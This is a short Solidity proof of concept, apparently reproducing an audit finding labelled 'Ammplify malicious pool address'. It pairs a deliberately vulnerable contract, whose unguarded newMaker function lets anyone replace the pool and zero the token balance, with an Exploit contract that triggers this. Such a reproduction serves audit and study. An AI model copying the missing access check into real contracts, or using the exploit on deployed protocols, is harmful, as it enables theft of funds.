// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 63179: Ammplify malicious pool address. Reduced local model preserves the reported state transition.

contract Vulnerable {
    address public pool; uint256 public protocolTokens = 1000; function newMaker(address candidate) external { pool = candidate; protocolTokens = 0; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        address target = address(0xBEEF); bug.newMaker(target); success = bug.pool() == target && bug.protocolTokens() == 0;
    }
}


